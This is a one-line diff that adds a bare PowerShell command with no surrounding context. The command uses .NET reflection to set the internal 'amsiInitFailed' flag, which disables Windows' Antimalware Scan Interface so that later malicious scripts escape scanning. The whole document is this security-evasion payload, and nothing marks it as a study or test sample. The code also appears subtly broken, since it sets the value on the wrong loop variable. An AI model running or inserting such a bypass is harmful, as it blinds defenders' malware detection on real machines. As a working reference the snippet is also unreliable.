@@ -1,0 +1,1 @@
+$a=[ref].assembly.gettypes();Foreach($b in $a){if($b.name -like "*iUtil*"){$c=$b;}};$d = $c.getfields("nonpublic, static");foreach($e in $d){if($e.name -like "*amsiinitfail*"){$f=$e;}};$e.setvalue($null,$true);
